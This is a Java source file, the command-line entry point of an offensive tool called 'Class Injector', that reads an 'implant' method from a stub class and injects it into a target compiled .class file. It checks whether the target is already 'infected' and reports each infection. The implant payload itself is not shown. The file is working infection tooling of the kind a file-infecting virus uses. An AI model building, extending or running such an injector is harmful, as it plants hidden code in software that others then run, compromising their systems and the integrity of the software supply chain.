package org.example;

import javassist.bytecode.ClassFile;
import javassist.bytecode.MethodInfo;
import org.example.injector.ImplantReader;
import org.example.injector.MethodInjector;
import org.example.injector.TargetAnalyzer;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

public class Cli {
    public static void main(String[] args) {
        System.out.println("    |-----[==Class=Injector=v0.1==]-----");
        if (args.length == 0) {
            System.out.println("[-] Usage: java -jar classinjector.jar <target-class-file>");
            System.exit(1);
        }

        final ClassFile implantClassFile;
        try {
            implantClassFile = ImplantReader.getStubImplant();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("[i] Source class: " + implantClassFile.getName());

        Path target = Path.of(args[0]);
        System.out.println("[i] Target class file: " + target);
        if (!Files.exists(target) || !Files.isWritable(target)) {
            System.out.println("[!] Target class file does not exist or is not writable!");
            System.exit(2);
        }

        MethodInfo implant;
        try {
            implant = ImplantReader.readImplant(implantClassFile, "implant");
            System.out.println("[+] Read and serialized payload: " + implant);
        } catch (IOException e) {
            System.out.println("[!] Failed to read payload! Error message: " + e.getMessage());
            System.exit(3);
            throw new RuntimeException("Unreachable", e);
        }

        final boolean isAlreadyInfected;
        try {
            isAlreadyInfected = TargetAnalyzer.loadClassFile(target).isInfected();
        } catch (IOException e) {
            System.out.println(("[!] Cannot read class! Error message: " + e.getMessage()));
            System.exit(4);
            throw new RuntimeException("Unreachable");
        }

        if (isAlreadyInfected) {
            System.out.println("[-] Target class already infected. Skipping.");
            System.exit(5);
        }

        MethodInjector injector = MethodInjector.of(implant);
        final boolean didInfect;
        try {
            didInfect = injector.infectTarget(target);
        } catch (IOException e) {
            System.out.println("[!] Cannot infect target class file! Error message: " + e.getMessage());
            System.exit(4);
            throw new RuntimeException("Unreachable");
        }

        if (!didInfect) {
            System.out.println("[-] Target class not suitable for infection. Skipping.");
        } else {
            System.out.println("[+] Infected target class: " + target);
        }
    }
}
